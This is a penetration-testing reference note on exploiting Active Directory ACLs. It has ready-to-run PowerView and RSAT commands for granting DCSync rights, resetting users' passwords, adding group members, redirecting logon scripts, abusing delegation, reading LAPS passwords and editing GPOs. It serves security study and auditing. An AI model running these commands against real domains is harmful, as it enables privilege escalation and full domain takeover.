# Active Directory - Exploiting Access Control Lists (ACL)

### Overview

Every Active Directory security principal object, uniquely identified by a
`Security Identifier (SID)` across a domain, has a security descriptor, which
dictates the trustees that are granted permissions over the object.

The security descriptor is formatted according to the `Security Descriptor
Definition Language (SDDL)` and will usually be divided into two types of
`ACL`:
  - A `Discretionary Access Control List (DACL)` which define the trustees
  that are allowed or denied permissions to the object
  - A `System Access Control List (SACL)` which can be used to log attempts to
  access the object.    

The `SDDL` uses `Access Control Entry (ACE)` strings in the `DACL` and `SACL`
components of a security descriptor string. Each `ACE` in a security descriptor
string is composed of a trustee SID and an access mask defining their
associated permissions / access rights. Moreover, a bit flag determine whether
child containers or objects can inherit the ACE from the primary object to
which the ACL is attached.

Each `ACE` in the `SACL` specifies the types of access attempts by a
specified trustee that cause the system to generate a record in the security
event log.

### Enumeration of DACL

###### Unitary enumeration

`DSACLS.exe` or `Get-ACL` from the `Remote Server Administration Tools (RSAT)`
and `PowerView`'s `Get-ObjectAcl` can be used to enumerate the `DACL` of an
Active Directory object.

For a more fine grained enumeration, and translation of extended rights GUID
to human readable names, the `Active Directory Users and Computers (dsa.msc)`
utility, integrated in the `Remote Server Administration Tools (RSAT)` tools
suite, can be used.
The `dsa.msc` can be started on out-of-the domain machines and using
Pass-the-hash attack through the `Microsoft Management Console (MMC)` utility.
For more information, refer to the `Active Directory - Domain Recon` note.

```
dsacls.exe <DistinguishedName>

# New-PSDrive is necessary on out-of-the-domain systems, the AD should automatically be mapped otherwise whenever importing the ActiveDirectory PowerShell module
New-PSDrive -Name AD -PSProvider ActiveDirectory -Server "<DC_IP>" -Credential <PSCredential>
Get-ACL -Path "AD:<DistinguishedName>" | Select -ExpandProperty Access | ? ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner'

Get-ObjectAcl -Identity <SamAccountName | DistinguishedName | SID | GUID>
Get-ObjectAcl -Identity <SamAccountName | DistinguishedName | SID | GUID> -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PSCredentials>

# List ACE of the specified user on the specified object
$UserSID = Get-DomainUser -Identity <SamAccountName | DistinguishedName | SID | GUID> | Select-Object -ExpandProperty objectsid
Get-ObjectAcl -Identity <SamAccountName | DistinguishedName | SID | GUID> -ResolveGUIDs | ? {$_.securityidentifier -eq $UserSID}
```

###### Domain-wide automated enumeration

The `BloodHound` ingestor `SharpHound` (`ACL` or `All` collection methods)
and the `PingCastle`'s `compromise graph` can be used to automatically
enumerate security objects `DACL` in order to find exploitable paths.
Refer to the `Active Directory - AD scanners` note for more information.

`PowerView` can also be used for domain-wide enumeration and filtering on
potentially exploitable `ACEs`. The absence of multi-threading however prevents
the use of such queries on larger Active Directory domains.

```
# [ALL]
# Enumeration of exploitable ACE on all AD objects defined for the Everyone, Authenticated Users and Domain Users groups
Get-DomainObjectAcl -Server <DC_HOSTNAME | DC_IP> -Credential <PSCredential> | ? { (($_.SecurityIdentifier -eq 'S-1-1-0') -or ($_.SecurityIdentifier -eq 'S-1-5-7') -or ($_.SecurityIdentifier -eq 'S-1-5-11') -or ($_.SecurityIdentifier -eq 'S-1-5-32-545') -or ($_.SecurityIdentifier -like 'S-1-5-*-513') -or ($_.SecurityIdentifier -like 'S-1-5-*-515')) -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

# [GPO]
# Enumeration of exploitable ACE on GPO objects defined for the Everyone, Authenticated Users and Domain Users groups
Get-DomainObjectAcl -Server <DC_HOSTNAME | DC_IP> -Credential <PSCredential>  -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { (($_.SecurityIdentifier -eq 'S-1-1-0') -or ($_.SecurityIdentifier -eq 'S-1-5-7') -or ($_.SecurityIdentifier -eq 'S-1-5-11') -or ($_.SecurityIdentifier -eq 'S-1-5-32-545') -or ($_.SecurityIdentifier -like 'S-1-5-*-513') -or ($_.SecurityIdentifier -like 'S-1-5-*-515')) -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

# [GPO]
# Enumeration on exploitable ACE on GPO objects for non-default users (RID >= 1000)
Get-DomainObjectAcl -Server <DC_HOSTNAME | DC_IP> -Credential <PSCredential> -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
```

The `AD ACL Scanner` GUI tool, written in PowerShell, can be used to enumerate
all the domain objects' ACL and export the result either to an HTML document or
a csv / xml file. The scan can be run on all the domain objects or recursively
on all objects in a specific Organizational Unit (Users, Computers, etc.).

For a full domain-wide scan, it is recommended to activate the following
options:
  - `Scan depth` -> `Subtree`
  - `Objects to scan` -> `All objects`
  - `View in report` -> `View Owner`, `Skip Default Permissions` and
    `SD Modified date`
  - `Output options` -> `Translate GUID's in CSV ouput` (to convert the
    properties GUID into their name)

The following objects classes may be specified in `Objects to scan` for a more
targeted scan approach:
  - Admin SD Holders: `(AdminCount=1)`
  - For GPO: `(objectClass=groupPolicyContainer)`

`Grouper2` can also be used, notably in a more thorough review of GPO
including the definition of user rights (`Active Directory - GPO users rights`)
and permissions on scripts and MSI packages executed / deployed through GPO.

```
Grouper2.exe -g -f <OUTPUT_HTML>
Grouper2.exe -u "<USERNAME>" -p "<PASSWORD>" -s "\\<DC_HOSTNAME | DC_IP>\SYSVOL" -g -f <OUTPUT_HTML>
```

The exploitable permissions, presented below, are of particular interest if
attributed for one of the following groups:
  - `Everyone`, SID: `S-1-1-0`
  - `Anonymous`, SID: `S-1-5-7`
  - `Authenticated Users`, SID: `S-1-5-11`
  - `Users`, SID: `S-1-5-32-545`
  - `Domain Users`, SID: `S-1-5-<DOMAIN>-513`
  - `Domain Computers`, SID: `S-1-5-<DOMAIN>-515`

### Domain root object exploitation

The domain root object yields the replication rights on the domain, necessary
to make use of the `DRSUAPI` replication functions and that can be leveraged to
conduct a `DCSync` attack.

The privileges on the `domain root object` necessary to make replication
requests through the `DRSUAPI` are as follow:
  - Replicating Directory Changes (`Ds-Replication-Get-Changes`,
    `ACE GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
  - Replicating Directory Changes All (`Ds-Replication-Get-Changes-All`,
    `ACE GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)

The ownership of the `domain root object`, or the `WriteOwner`, `WriteDACL`,
`GenericAll` (on all properties, i.e the `ObjectGuid` of the `ACE` being equal
to `00000000-0000-0000-0000-000000000000`) privileges on the
`domain root object` can be, directly or indirectly, leveraged to grant the
`Ds-Replication-Get-Changes` and `Ds-Replication-Get-Changes-All` privileges
on the domain.  

```
# DOMAIN_ROOT_OBJECT = "DC=LAB,DC=AD" for example

# Direct replication rights
Get-ACL -Path "AD:<DOMAIN_ROOT_OBJECT>" | Select -ExpandProperty Access | ? ObjectType -match '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'

# Rights that can be leveraged to modify the domain root object ACL to grant the privileges required for DRSUAPI replication
Get-ACL -Path "AD:<DOMAIN_ROOT_OBJECT>" | Select -ExpandProperty Access | ? ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'
```

The privileges above can be exploited either using the GUI `RSAT`'s `dsa.msc`
utility or using the following `PowerView` PowerShell cmdlets:

```
# Specifies ownership of the domain root object if needed (exploits having WriteOwner privilege on the domain root object with out the GenericAll or WriteDACL privileges)
Set-DomainObjectOwner -Verbose -Identity <DOMAIN_ROOT_OBJECT> -OwnerIdentity <SamAccountName | DistinguishedName | SID | GUID>
Set-DomainObjectOwner -Verbose -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN_FQDN> -Credential <PSCredentials> -Identity <DOMAIN_ROOT_OBJECT> -OwnerIdentity <SamAccountName | DistinguishedName | SID | GUID> -Verbose

# Once the domain owner is changed, the GenericAll privilege can be granted to users using the new owner identity
Add-DomainObjectAcl -Verbose -TargetIdentity <DOMAIN_ROOT_OBJECT> -PrincipalIdentity <SamAccountName | DistinguishedName | SID | GUID> -Rights DCSync
Add-DomainObjectAcl -Verbose -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN_FQDN> -Credential <PSCredentials> -TargetIdentity <DOMAIN_ROOT_OBJECT> -PrincipalIdentity <SamAccountName | DistinguishedName | SID | GUID> -Rights DCSync
```  

Alternatively, a more manual approach, using the `RSAT` `Get-Acl` and `Set-Acl`
PowerShell cmldets can be conducted (script largely inspired from `gdedrouas`
's `Exchange-AD-Privesc`):

```
# If needed, on a system with out the RSAT installed
# Import-Module C:\Tools\Microsoft.ActiveDirectory.Management.dll

New-PSDrive -Name AD -PSProvider ActiveDirectory -Server "<DC_IP>"
$acl = Get-ACL "AD:<DOMAIN_ROOT_OBJECT>"
$sidStr = "<USER_SID>"
$sid = New-Object System.Security.Principal.SecurityIdentifier $sidStr
$objectGuid = New-Object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$identity = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
$objectGuid = New-Object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
Set-Acl -AclObject $acl "AD:<DOMAIN_ROOT_OBJECT>"
```

### Users and groups permissions exploitation

###### Summary

The access rights detailed below can be exploited to gain control over an
Active Directory object.

The `GenericAll` and `WriteProperty` rights apply over the attribute specified
by its `ObjectGuid` (`ObjectType` property from PowerShell cmdlet).
If the `ObjectGuid` is equal to `00000000-0000-0000-0000-000000000000`, the
right apply to all the properties of the object.

If the `InheritedObjectType` (`PropagationFlags`) is set to `InheritOnly`, the
access right define by the ACE only apply to the child objects and not the
object itself.

| Object type | Privilege | Description |
|-------------|-----|-------------|
| User | `GenericAll` | Full rights on the security object (including `WriteOwner` and `WriteDacl`), can be used to change the user password. |
| User | `GenericWrite` | Ability to update any non-protected object (almost) all properties values. Similar to `WriteProperty` to `all properties`. |
| User | `ForceChangePassword` | Ability to change the user password. |
| User | `AllExtendedRights` | Ability to perform any action associated with extended Active Directory rights against the object, can be used to change the user password. |
| User | `WriteOwner` | Ability to change the owner of the user, thus granting complete control over the user and notably the ability to change the user's password. |
| User | `WriteDacl` | Ability to change the DACL of the user, thus granting complete control over the user and notably the ability to add ACE to change the user's password. |
| User | `WriteProperty` to `all properties` | Ability to update any non-protected user properties values and notably update the `Script-Path` or `servicePrincipalName` properties. |
| User | `WriteProperty` to `Script-Path` | Ability to update any non-protected user logon script path which will be executed on the system upon user logon. |
| User | `WriteProperty` to `Public-Information/servicePrincipalName` | Ability to define or update the `Public-Information` allows to define or write an user `servicePrincipalName`, which exposes the account to Kerberoasting. |
| User | `WriteProperty` to `Public-Information/User-Principal-Name` & `Public-Information/Alt-Security-Identities` | Ability to define or update the `Public-Information` allows to define or write the `User-Principal-Name` or `Alt-Security-Identities`, which can be used to authenticate using a controlled trusted certificate. |
| Group | `GenericAll` | Full rights on the security object (including `WriteOwner` and `WriteDacl`), can be used to add an user to the group. |
| Group | `GenericWrite` | Ability to update any non-protected object (almost) all properties values. Similar to `WriteProperty` to `all properties`. |
| Group | `AddMembers` | Ability to add other security objects to the group. |
| Group | `AllExtendedRights` | Ability to perform any action associated with extended Active Directory rights against the object, can be used to add others security objects to the group. |
| Group | `Self (Self-Membership)` | Ability to update any non-protected group members by adding/removing one's own account to the group. |
| Group | `WriteOwner` | Ability to change the owner of the group, thus granting complete control over the group and notably the ability to add others security objects to the group. |
| Group | `WriteDacl` | Ability to change the DACL of the group, thus granting complete control over the group and notably the ability to add others security objects to the group. |
| Group | `WriteProperty` to `all properties` | Ability to update any non-protected group properties values and notably the member property, thus allowing to add others security objects to the group. |
| Group | `WriteProperty` to the `member` or `Self-Membership` properties | Ability to update any non-protected group members, thus allowing to add others security objects to the group. |

###### User - GenericAll / ForceChangePassword / AllExtendedRights / WriteProperty to all properties

`net user`, `RSAT`'s `Set-ADAccountPassword`, and `PowerView`'s
`Set-DomainUserPassword` can be used to change the vulnerable user's password:

```
net user <USERNAME> NewPassword123! /domain

Set-ADAccountPassword -Identity <SamAccountName | DistinguishedName | SID | GUID> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "<PASSWORD>" -Force)
Set-ADAccountPassword -Server <DC_HOSTNAME | DC_IP> -Credential <PSCredentials> -Identity <SamAccountName | DistinguishedName | SID | GUID> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "<PASSWORD>" -Force)

$UserPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <SamAccountName | DistinguishedName | SID | GUID> -AccountPassword $UserPassword
Set-DomainUserPassword -Domain <DOMAIN> -Credential <PSCredentials> -Identity <SamAccountName | DistinguishedName | SID | GUID> -AccountPassword $UserPassword
```

###### User - WriteProperty to Script-Path

The `RSAT`'s `Set-ADObject` and `PowerView`'s `Set-DomainObject` PowerShell
cmdlets can be used to modify the properties of a security object.

```
Set-ADObject -Identity <SamAccountName | DistinguishedName | SID | GUID> [-Add / -Replace] @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}
Set-ADObject -Server <DC_HOSTNAME | DC_IP> -Credential <PSCredentials> -Identity <SamAccountName | DistinguishedName | SID | GUID> [-Add / -Replace] @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}

Set-DomainObject -Identity <SamAccountName | DistinguishedName | SID | GUID> -Set @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}
Set-DomainObject -Server <DC_HOSTNAME | DC_IP> -Credential <PSCredentials> -Identity <SamAccountName | DistinguishedName | SID | GUID> -Set @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}
```

###### User - WriteProperty to Public-Information/servicePrincipalName

The `Public-Information` attribute contains, among others, the
`User-Principal-Name` and `Alt-Security-Identities` properties.

The `ObjectType` of the `Public-Information` is
`e48d0154-bcf8-11d1-8702-00c04fb96050`.

The `RSAT`'s `Set-ADUser` PowerShell cmdlet can be used to define or update
the specified user `servicePrincipalName`.

```
# SPN example: SQLservice\accounting.corp.contoso.com:1456
Set-ADUser -Identity <SamAccountName | DistinguishedName | SID | GUID> -ServicePrincipalNames @{Add="<SPN>"}"}
```

###### User - WriteProperty to Public-Information/User-Principal-Name & Public-Information/Alt-Security-Identities

The `Public-Information` attribute contains, among others, the
`User-Principal-Name` and `Alt-Security-Identities` properties.

The `ObjectType` of the `Public-Information` is
`e48d0154-bcf8-11d1-8702-00c04fb96050`.

A certificate issued by a `Certificate Authority (CA)` trusted by the domain
must be controlled in order to be able to authenticate using a certificate.

The certificate must allow for remote authentication, meaning the
`EnhancedKeyUsageList` certificate attribute must contain the value
`(1.3.6.1.5.5.7.3.2)`. If so, the certificate will be marked as:

```
"The certificate can be used for authenticating a client."
"Garantit votre identité auprès d'un ordinateur distant."
```

The following utilities can be used to interact with the Windows certificate
stores:

```
# View AD NTAuth trusted CA
certutil -enterprise -viewstore CA

# View local certificate store for current user
certutil -store -user My

Get-ChildItem -Recurse Cert:\CurrentUser\My\ | Format-List Thumbprint,Issuer,Subject,EnhancedKeyUsageList,HasPrivateKey,NotBefore,NotAfter

mmc.exe -> Add/Remove Snap-in (Ctrl + M) -> Selection of one or multiple chosen snap-in -> Certificates -> Personnal -> Certificates
```

Setting the `User-Principal-Name` and `Alt-Security-Identities` properties is
more easily done through the `Microsoft Management Console (MMC)` utility.
The properties should be set to the `RFC822` name format found in the
certificate details using the `mmc.exe` utility.

Once the modification is made, the `kekeo` tool can be used to request a
`Ticket-Granting Ticket (TGT)` for the targeted security principal:

```
# UPN name format example: USERNAME@DOMAIN_FQDN
kekeo# tgt::ask /subject:"<SUBJECT_NAME_CONTAINS>" /castore:current_user /user:<UPN>
```

Note that in order to get around the replication time between Domain
Controllers, it is recommended to request a `TGT` from the `KDC` of the Domain
Controller on which was done the user object update.

###### Group - GenericAll / GenericWrite / AddMembers / AllExtendedRights / WriteProperty to all properties / WriteProperty to the member or Self-Membership properties / Self (Self-Membership)

Generic Write access grants the ability to write to any non-protected attribute
on the target object, including "members" for a group.

`net group`, `RSAT`'s `Add-ADGroupMember`, and `PowerView`'s
`Add-DomainGroupMember` PowerShell cmdlets can be used to add others security
objects to the specified group.

```
net group "<GROUP>" <USERNAME> /add /domain

Add-ADGroupMember -Identity "<GROUP>" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
Add-ADGroupMember -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PSCredentials> -Identity "<GROUP>" -Members <USERNAME>

Add-DomainGroupMember -Identity "<GROUP>" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
Add-DomainGroupMember -Domain <DOMAIN> -Credential <PSCredentials> -Identity "<GROUP>" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
```

###### User / group - WriteOwner

`PowerView`'s `Set-DomainObjectOwner` PowerShell cmdlet can be used to change
the owner of a security object. Being the owner of an user can be leveraged to
change the user password and being the owner of a group can allows for the
addition of others security objects to the group.

```
Set-DomainObjectOwner -Verbose -Identity <SamAccountName | DistinguishedName | SID | GUID> -OwnerIdentity <SamAccountName | DistinguishedName | SID | GUID>
Set-DomainObjectOwner -Verbose -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PSCredentials> -Identity <SamAccountName | DistinguishedName | SID | GUID> -OwnerIdentity <SamAccountName | DistinguishedName | SID | GUID>

# Once the user / group owner is changed, the GenericAll privilege can be granted to users using the new owner identity
# Refer to the "User - GenericAll" and "Group - GenericAll" parts for further exploitation
Add-DomainObjectAcl -PrincipalIdentity <SamAccountName | DistinguishedName | SID | GUID> -TargetIdentity <SamAccountName | DistinguishedName | SID | GUID> -Rights All
```

###### User / group - WriteDacl

`PowerView`'s `Add-DomainObjectAcl` PowerShell cmdlet can be used to modify
the specified object ACE by adding the following rights: `All`, `ResetPassword`
and `WriteMembers` to the specified security object.

```
# TargetIdentity: security object that will be modified
# PrincipalIdentity: security object that will be given the right over the targeted object

Add-DomainObjectAcl -Verbose -TargetIdentity <SamAccountName | DistinguishedName | SID | GUID> -PrincipalIdentity <SamAccountName | DistinguishedName | SID | GUID> -Rights <All | ResetPassword | WriteMembers>
Add-DomainObjectAcl -Verbose -Server <DC_HOSTNAME | DC_IP> -Credential <PSCredentials> -TargetIdentity <SamAccountName | DistinguishedName | SID | GUID> -PrincipalIdentity <SamAccountName | DistinguishedName | SID | GUID> -Rights <All | ResetPassword | WriteMembers>
```

###### Automated exploitation

The PowerShell cmdlet `Invoke-ACLpwn`, leveraging `SharpHound.exe` and thus
`.NET 3.5`, can be used to exhaustively enumerate the domain security principal
objects `DACLs` and find potential paths leading to privileges escalation.

Note that `Invoke-ACLpwn` will actively add the specified user to security
groups it has control over.

```
Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe

Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -Domain '<DOMAIN>' -Username '<USERNAME>' -Password '<PASSWORD>'
```

### Computer machine account ACL exploitation

###### LAPS ms-Mcs-AdmPwd

The Microsoft `Local Administrator Password Solution (LAPS)` solution provides
management capacity of local account passwords of domain joined computers.
Whenever `LAPS` is installed in an Active Directory domain, the domain schema
is modified with the addition of two attributes for the computer machine
objects:
  - `ms-Mcs-AdmPwd`, a `confidential` attribute, which can store one of the
    machine's local account password (such as the local built-in Administrator
    for example).
  - `ms-Mcs-AdmPwdExpirationTime`, which defines the expiration date of the
    password stored.

The access to the `LAPS` password is protected through the `ACL` defined on the
computer machine account and its `ms-Mcs-AdmPwd` attribute. By default, only
the members of the `Domain Admins` group can access (`ReadProperty`) the
`LAPS` password. The right to access the `LAPS` password is usually delegated,
through utilities such as `Set-AdmPwdReadPasswordPermission`, at the
`Organisational Unit (OU)` level, to be applied to every computers object in
the `OU`.  

The PowerShell cmdlets of the `ActiveDirectory` and the `LAPSToolkit` suite,
based on `PowerView`, can be used to enumerate the access to the `LAPS`
password:

```
# Retrieves all domain-joined computers with LAPS enabled and additionally displays the LAPS password given sufficient privileges (ReadProperty on the ms-Mcs-AdmPwd).
Get-ADComputer -Filter {ms-mcs-admpwdexpirationtime -like "*"} -Properties * | Ft Name,ms-Mcs-AdmPwdExpirationTime,ms-Mcs-AdmPwd
Get-LAPSComputers
Get-LAPSComputers | Export-Csv -NoTypeInformation -Path <OUTPUT_CSV>

# Retrieves the users or groups that are delegated the ReadProperty right on the ms-Mcs-AdmPwd attribute at the OU level.
Find-LAPSDelegatedGroups
Find-LAPSDelegatedGroups | Export-Csv -NoTypeInformation -Path <OUTPUT_CSV>

# Enumerates every computers objects in the domain with LAPS enabled, parses the eventual ExtendedRight ACL to precisely determine which security principals can read the ms-Mcs-AdmPwd attribute.
# Due to performance issue, will be tremendously long on larger domain.
Find-AdmPwdExtendedRights
Find-AdmPwdExtendedRights | Export-Csv -NoTypeInformation -Path <OUTPUT_CSV>
```

###### msDS-AllowedToActOnBehalfOfOtherIdentity

The right to write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of
a domain machine account can lead to the remote compromise of the machine,
through the exploitation of `Kerberos` `resource-based constrained
delegation` implementation.

This right may be granted:
  - specifically through `WriteProperty` / `GenericWrite` on
    the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
    (`GUID: 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79`),
  - indirectly through ownership of the machine account,
  - directly and indirectly through broader control rights on the machine
    account (`GenericAll`, `WriteOwner`, `WriteDACL`, `WriteProperty` /
    `GenericWrite` on all attributes).

Refer to the `[ActiveDirectory] Kerberos delegations` note for more information
on how to conduct the machine takeover (after acquiring the right to write the
`msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of a targeted machine).

*WriteOwner to WriteProperty `msDS-AllowedToActOnBehalfOfOtherIdentity`*

`PowerView`'s `Set-DomainObjectOwner` PowerShell cmdlet can be used to change
the owner of a domain service or machine account. Ownership of a domain service
or machine account can be subsequently leveraged, using `PowerView`'s
`Add-DomainObjectAcl` PowerShell cmdlet, to modify the object's `ACL` in order
to obtain the right to modify its `msDS-AllowedToActOnBehalfOfOtherIdentity`
attribute.

```
# IDENTITY: DistinguishedName (DN), GUID, SID or SamAccountName
Set-DomainObjectOwner -Verbose -Identity <TARGET_OBJECT_IDENTITY> -OwnerIdentity <IDENTITY>
Set-DomainObjectOwner -Verbose -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PSCredentials> -Identity <TARGET_OBJECT_IDENTITY> -OwnerIdentity <IDENTITY>
```

*Ownership / WriteDACL to WriteProperty `msDS-AllowedToActOnBehalfOfOtherIdentity`*

`PowerView`'s `Add-DomainObjectAcl` PowerShell cmdlet can be used to modify
the targeted domain service or machine account's `ACL` in order to grant the
specified security principal the `WriteProperty` right on the targeted account
`msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

```
# TARGET_OBJECT_IDENTITY: (DistinguishedName (DN), GUID, SID or SamAccountName of the) security object that will be modified.
# PRINCIPALIDENTITY: (DistinguishedName (DN), GUID, SID or SamAccountName of the) security object that will be given the right over the targeted object

Add-DomainObjectAcl -Verbose -TargetIdentity <TARGET_OBJECT_IDENTITY> -PrincipalIdentity <PRINCIPALIDENTITY> -RightsGUID "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79"
Add-DomainObjectAcl -Verbose -Server <DC_HOSTNAME | DC_IP> -Credential <PSCredentials> -TargetIdentity <TARGET_OBJECT_IDENTITY> -PrincipalIdentity <PRINCIPALIDENTITY> -RightsGUID "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79"
```

### GPO ACEs exploitation

###### GPO enforcement

GPO can be linked to an Organizational Unit (OU) but not necessarily applied,
as an OU can `blocks inheritance` on an not `enforced` linked (`GPLink`) GPO or
a conflicting GPO with a higher precedence order may supplant the exploitable
GPO.

The precedence order respect the principle that, in case of conflicting
settings in GPOs, the last GPO applied will overwrite any settings applied
earlier and the GPO closest to the client location in the directory structure
will be applied last. Concretely, the precedence order is as follow (from the
applied first / lowest in the precedence order to the applied last / highest in
the precedence order):
  - local GPO
  - site GPO
  - domain GPO
  - OU (for nested OU, the GPO closer to the object being the highest in the
    precedence order)

Others mechanisms, such as `WMI filtering` (which restrains the application of
the GPO depending on the result of a true / false WMI query), or `Security
filtering` (which restrains to specific members - users and groups - of
security groups) may further influence the GPO enforcement.

For now, `BloodHound` takes into account the `block inheritance` / `enforced`
mechanism but not the precedence order nor the `WMI filtering` and `security
filtering`.

`PowerView` can also be used to find where exploitable GPO are linked and
**possibly** applied by retrieving the `GPLink` attribute of an OU.

```
Get-DomainOU -GPLink "<GPO_GUID>" | ForEach-Object {
    Get-DomainComputer -SearchBase "LDAP://$($_.distinguishedname)" | Ft Name
}

# With Credential and Server
Get-DomainOU -Server <DC> -Credential <PSCredential> -GPLink "<GPO_GUID>" | ForEach-Object {
    Get-DomainComputer -Server <DC> -Credential <PSCredential> -SearchBase "LDAP://$($_.distinguishedname)" | Ft Name
}
```

However, this will not take into account the rules of inheritance and
precedence.

###### Exploitable access rights

The following access rights can be exploited to ultimately edit a GPO:

| Privilege | Description |
|-----|-------------|
| `WriteProperty` | Right to modify the GPO. This specific right is assigned when delegating the permission `Edit settings` through the `Group Management Policy Console (GMPC)`. Note that if the attribute `ObjectAceFlags` has for value `ObjectAceTypePresent` then only the property identified by the `ObjectAceType` attribute will be editable. |
| `WriteOwner` | Ability to change the owner of the GPO, thus granting complete control over the GPO and notably the ability to edit it. This right is assigned when delegating the permission `Edit settings, delete, modify security` through the `Group Management Policy Console (GMPC)`. |
| `WriteDacl` | Ability to change the DACL of the GPO object, thus granting complete control over the GPO and notably the ability to edit it. This right is assigned when delegating the permission `Edit settings, delete, modify security` through the `Group Management Policy Console (GMPC)`. |
| `GenericAll` | Full rights on the GPO object (including `WriteProperty`, `WriteOwner` and `WriteDacl`). This right can only be assigned through the `Advanced Security Settings` of the `Group Management Policy Console (GMPC)` (`Full control`) or by manually modifying the GPO object's ACL. |
| `GenericWrite` | Ability to update any non-protected object (almost) all properties values. Similar to `WriteProperty` to `all properties`. Does not appear to be settable through the `Group Management Policy Console (GMPC)`.  |

The `WriteOwner` access right can be exploited to take ownership of the GPO
folder in the `SYSVOL` share using the Windows explorer utility. The advanced
Security properties (`Right click -> Properties -> Security -> Advanced`) has
an option the change the GPO owner.

###### Version numbers

A GPO can be modified by directly editing the GPO files in the `SYSVOL`
directory. However, if doing so, a number of parameters must also be updated.

Indeed, the `versionNumber` attribute of the GPO object and the `Version`
attribute within the `GPT.ini` file in the SYSVOL must be increased, otherwise
the change made to the GPO won't be replicated on others domain controllers and
clients will not pull the changes during normal GPO update cycle.

The `GPT.ini`, located in
`\\<DOMAIN>\SYSVOL\<DOMAIN_FQDN>\Policies\<GPO_GUID>`, is a simple text file
that can be edited using any text editor or with the following PowerShell
one-liner:

```
Get-Content -Path "\\<DOMAIN>\SYSVOL\<DOMAIN_FQDN>\Policies\<GPO_GUID>\GPT.INI"
(Get-Content -Path "\\<DOMAIN>\SYSVOL\<DOMAIN_FQDN>\Policies\<GPO_GUID>\GPT.INI") -Replace "^Version=.*","Version=<NEW_VERSION>" | Out-File "\\<DOMAIN>\SYSVOL\<DOMAIN_FQDN>\Policies\<GPO_GUID>\GPT.INI"

# Get-Content does not support the use of -Credential / -Server.
# In order to use authentication, a new drive must be configured
net use Z: "\\<DC_HOSTNAME | DC_IP>\SYSVOL" <PASSWORD> /user:<DOMAIN>\<USERNAME>

Get-Content -Path "Z:\<DOMAIN_FQDN>\Policies\<GPO_GUID>\GPT.INI"

(Get-Content -Path "Z:\<DOMAIN_FQDN>\Policies\<GPO_GUID>\GPT.INI") -Replace "^Version=.*","Version=<NEW_VERSION>" | Out-File "Z:\<DOMAIN_FQDN>\Policies\<GPO_GUID>\GPT.INI"

net use Z: /delete
```

The `versionNumber` attribute of the GPO object can be modified using
`PowerView`. Note that the `Group Policy` module for PowerShell does not
provides any editing cmdlets for existing GPO.  

```
Get-DomainGPO -Identity "<GPO_NAME | GPO_GUID>" -Properties VersionNumber

Get-DomainGPO -Identity "<GPO_NAME | GPO_GUID>" | Set-DomainObject -Set @{'versionnumber'='<NEW_VERSION>'}
```

###### gPCMachineExtensionNames / gPCUserExtensionNames

The `gPCMachineExtensionNames` or `gPCUserExtensionNames` attributes of a GPO
object refer to the machine / user settings modified.

For example, the following GUID must be added in the `gPCMachineExtensionNames`
attribute in order to make possible the creation of a new user and/or the
update of a local group of the computer the GPO is applied to:

```
# Default extension for GPO modifying the Computer Configuration
{00000000-0000-0000-0000-000000000000} - Core GPO Engine

# User creation or group membership update
{17D89FEC-5C44-4972-B12D-241CAEF74509} - Preference CSE GUID Local users and groups
{79F92669-4224-476C-9C5C-6EFB4D87DF4A} - Preference Tool CSE GUID Local users and groups
```

The `gPCMachineExtensionNames` and `gPCUserExtensionNames` attributes of the
GPO object can be modified using `PowerView`. Note that the `Group Policy`
module for PowerShell does not provides any editing cmdlets for existing GPO:

```
Get-DomainGPO -Identity "<GPO_NAME | GPO_GUID>" -Properties gPCMachineExtensionNames | Select-Object -ExpandProperty gPCMachineExtensionNames

